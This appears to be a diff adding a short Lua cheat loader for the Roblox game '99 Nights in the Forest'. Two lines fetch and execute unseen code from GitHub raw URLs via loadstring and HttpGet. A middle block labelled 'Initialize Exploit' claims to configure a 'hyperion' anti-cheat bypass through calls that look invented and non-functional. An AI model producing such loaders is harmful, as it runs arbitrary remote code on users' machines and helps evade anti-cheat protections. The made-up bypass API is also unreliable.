@@ -1,0 +1,13 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenniel123/99-Nights-in-the-Forest/refs/heads/main/99%20Nights%20in%20the%20Forest"))()
+    -- Initialize Exploit
+local script = require("bypass")
+
+-- Configure settings
+executor.config({
+    bypass = "hyperion"
+})
+
+-- Execute script
+local success = lua:execute(script)
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/sudaisontopxd/PhantomFlux/refs/heads/main/99NightsInTheForest', true))()
+    
